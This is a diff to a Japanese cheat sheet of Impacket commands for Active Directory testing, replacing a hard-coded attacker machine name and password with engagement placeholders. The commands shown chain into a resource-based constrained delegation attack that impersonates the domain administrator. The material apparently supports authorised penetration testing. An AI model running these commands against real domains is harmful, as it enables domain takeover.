@@ -10,8 +10,8 @@ AD 環境での攻撃・調査に使う Impacket ツール群のまとめ。
 
 ```bash
 impacket-addcomputer \
-  -computer-name 'ATTACKPC$' \
-  -computer-pass 'Password123!' \
+  -computer-name '[CASE_ID]_TEST$' \
+  -computer-pass '[CLIENT_PROVIDED_PASSWORD]' \
   -dc-ip [DC_IP] \
   '[DOMAIN]/[USER]:[PASSWORD]'
 ```
@@ -50,7 +50,7 @@ impacket-getST \
   -spn 'cifs/[DC_FQDN]' \
   -impersonate administrator \
   -dc-ip [DC_IP] \
-  '[DOMAIN]/ATTACKPC$:Password123!'
+  '[DOMAIN]/[CASE_ID]_TEST$:[CLIENT_PROVIDED_PASSWORD]'
 ```
 
 **用途:** RBCD 攻撃の Step 3。Administrator の TGS を取得する。
@@ -75,7 +75,7 @@ impacket-ticketer \
 ```bash
 impacket-rbcd \
   -delegate-to '[DC_HOSTNAME]$' \
-  -delegate-from 'ATTACKPC$' \
+  -delegate-from '[CASE_ID]_TEST$' \
   -action write \
   -dc-ip [DC_IP] \
   '[DOMAIN]/[USER]:[PASSWORD]'
